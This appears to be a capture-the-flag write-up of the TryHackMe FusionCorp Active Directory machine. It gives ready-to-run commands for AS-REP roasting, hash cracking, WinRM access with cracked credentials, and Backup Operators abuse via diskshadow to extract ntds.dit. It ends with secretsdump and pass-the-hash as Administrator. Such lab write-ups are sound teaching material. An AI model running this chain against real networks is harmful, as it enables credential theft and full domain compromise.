---
title: "FusionCorp TryHackMe" 
date: 2025-06-15 23:50:00 0000+
tags: [WriteUp, FusionCorp, THM, Enumeration, BackupOperators, Active Directory, Lateral Movement, Privilege Escalation, Windows]
categories: [WriteUps, TryHackMe]
image:
  path: /assets/images/FusionCorpTHM/preview_fusioncorp.jpeg
---


# Fusion Corp THM Writeup

FusionCorp was an Active directory (hard box) from TryHackMe which focuses on ASREP roasting, hash cracking, lateral movement, backup operators privilege escalation and exposing of clear-text credentials.

## Initial Enumeration

We start with **Rustmap** to find all the open ports and services.

[https://github.com/A45hw1n/Rustmap](https://github.com/A45hw1n/Rustmap)

```bash
rustmap.py -ip 10.10.238.231
```

![image.png](/assets/images/FusionCorpTHM/image.png)

![image.png](/assets/images/FusionCorpTHM/image%201.png)

Ran NetExec to check the null authentication which also reveals the DC name and the domain

```bash
nxc smb 10.10.238.231 -u '' -p '' 
```

![image.png](/assets/images/FusionCorpTHM/image%202.png)

We have null authentication but listing shares are not allowed also the guest access is disabled.

![image.png](/assets/images/FusionCorpTHM/image%203.png)

We have port 80 open on fusion.corp visiting it, we have a website running Microsoft IIS web server version 10.0.

Looking at the website’s structure we have potential usernames to test with.

![image.png](/assets/images/FusionCorpTHM/image%204.png)

Gathered all the usernames and put them into the usernames.txt file.

Now used Username-anarchy to create a potential username list.

```bash
/opt/username-anarchy/username-anarchy -i usernames.txt > u ; cat u > usernames.txt
```

Tried doing user enumeration with kerbrute.

```bash
kerbrute userenum --dc 10.10.238.231 -d fusion.corp usernames.txt
```

![image.png](/assets/images/FusionCorpTHM/image%205.png)

But it didn’t find any useful usernames from our generated usernames.txt

Did a little web enumeration using gobuster. 

```bash
gobuster dir -u http://fusion.corp/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -t 100
```

![image.png](/assets/images/FusionCorpTHM/image%206.png)

Found a backup directory which gives me a employees.ods file.

![image.png](/assets/images/FusionCorpTHM/image%207.png)

Opening this file in libreoffice gives us more users.

![image.png](/assets/images/FusionCorpTHM/image%208.png)

Updating the usernames.txt file and again running the username-anarchy to generate a new users file.

![image.png](/assets/images/FusionCorpTHM/image%209.png)

Username-anarchy created a new list of users with count of 158

![image.png](/assets/images/FusionCorpTHM/image%2010.png)

Running Kerbrute again gives us the valid username → lparker@fusion.corp

```bash
kerbrute userenum --dc 10.10.238.231 -d fusion.corp usernames.txt
```

![image.png](/assets/images/FusionCorpTHM/image%2011.png)

If we are running the kerbrute dev version, then it also identifies the ASREP (accounts with NO PRE AUTH SET) users too, which in our case is lparker@fusion.corp and dump their hashes in the crackable format.

Running hashcat to crack this Kerberos 5, etype 23, AS-REP hash.

![image.png](/assets/images/FusionCorpTHM/image%2012.png)

Hashcat was exhausted and didn’t found any valid password.

Also we noticed that the hashcat mode that we are using is etype23 and the hashcat we got has an etype of 18.

So now we again ran kerbrute with —downgrade option to get the etype 23 hash

```bash
kerbrute userenum --downgrade --dc 10.10.238.231 -d fusion.corp usernames.txt
```

![image.png](/assets/images/FusionCorpTHM/image%2013.png)

Now running hashcat to crack this etype23 hash.

```bash
hashcat -m 18200 ./hashes.txt /usr/share/wordlists/rockyou.txt
```

![image.png](/assets/images/FusionCorpTHM/image%2014.png)

Resulted in successfully cracking the hash.

Now we have the creds for lparker@fusion.corp

## Shell as Lparker

After getting creds for lparker we tried doing SMB enumeration.

Nothing interesting found in the SMB shares.

```bash
nxc smb fusion.corp -u 'lparker' -p '!!abbylvzsvs2k6!' --shares
```

![image.png](/assets/images/FusionCorpTHM/image%2015.png)

lparker user has remote access to the server.

```bash
nxc winrm fusion.corp -u 'lparker' -p '!!abbylvzsvs2k6!'
```

![image.png](/assets/images/FusionCorpTHM/image%2016.png)

Logged in as lparker using Evil-winrm to retrieve our first flag.

```bash
evil-winrm 10.10.238.231 -u 'lparker' -p '!!abbylvzsvs2k6!'
```

![image.png](/assets/images/FusionCorpTHM/image%2017.png)

Now to do lateral movement, we used bloodhound-python to gather and analyse the full domain in Bloodhound.

```bash
bloodhound-python -u 'lparker' -p '!!abbylvzsvs2k6!' -dc fusion-dc.fusion.corp -d fusion.corp -ns 10.10.238.231 -c all --zip
```

![image.png](/assets/images/FusionCorpTHM/image%2018.png)

## Shell as Jmurphy

Did Analysis within bloodhound but didnt found anything.

Enumerated more users using the lparker’s creds.

```bash
nxc ldap fusion.corp -u 'lparker' -p '!!abbylvzsvs2k6!' --users
```

![image.png](/assets/images/FusionCorpTHM/image%2019.png)

Found the clear text credentials for Jmurphy user.

Logged in using evil-winrm as jmurphy.

We can see that jmurphy is part of backup operators group, and the users who are part of this group can create a shadow copy of the system.hive and the ntds.dit database to escalate their privileges.

![image.png](/assets/images/FusionCorpTHM/image%2020.png)

Now we create a backup.txt file containing the following commands:

```bash
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
```

Then through the Jmurphy shell:

We created a new directory in C:\, and uploaded the backup.txt file there.

 

```bash
New-Item -Type Directory C:\temp\
upload backup.txt
```

![image.png](/assets/images/FusionCorpTHM/image%2021.png)

But when I tried to create the diskshadow of the file it failed with this error.

![image.png](/assets/images/FusionCorpTHM/image%2022.png)

The above error is because we created this file in linux box, and transferred it to a windows box resulting in the dos errors also knows as parsing errors.

![image.png](/assets/images/FusionCorpTHM/image%2023.png)

So first we need to convert this backup.txt file to dos file and then transfer it to windows machine.

![image.png](/assets/images/FusionCorpTHM/image%2024.png)

Now we have the fixed file to be transferred to the remote windows machine.

Transffered the file and ran the diskshadow command.

```bash
diskshadow /s backup.txt
```

![image.png](/assets/images/FusionCorpTHM/image%2025.png)

Now we used robocopy to copy the ntds.dit database file to our shadow drive E:\

```bash
robocopy /b E:\windows\ntds . ntds.dit
```

![image.png](/assets/images/FusionCorpTHM/image%2026.png)

Also saved the system hive file to our temp directory.

```bash
reg save hklm\system c:\temp\system
```

![image.png](/assets/images/FusionCorpTHM/image%2027.png)

Now after saving NTDS.DIT and SYSTEM hives, we can download them to our local linux box (mine’s parrot).

```bash
download ntds.dit
download system
```

![image.png](/assets/images/FusionCorpTHM/image%2028.png)

After successful download of NTDS.DIT and SYSTEM files we use [secretsdump.py](http://secretsdump.py) to dump all the secrets of the domain.

```bash
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

![image.png](/assets/images/FusionCorpTHM/image%2029.png)

Output of secretsdump.py

## Shell as Administrator

Now we have the hash of the Administrator account.

```bash
evil-winrm -i 10.10.248.100 -u 'Administrator' -H 9653b02d945329c7270525c4c2a69c67
```

First we retrieve the flag for Jmurphy.

![image.png](/assets/images/FusionCorpTHM/image%2030.png)

And lastly retrieve the root flag from the Administrator’s desktop.

![image.png](/assets/images/FusionCorpTHM/image%2031.png)

Rooted !!

Thanks for reading 😄

Note - You observed that the machine’s IP getting change 2-3 times in this write-up, unfortunately the machine keeps on terminating.
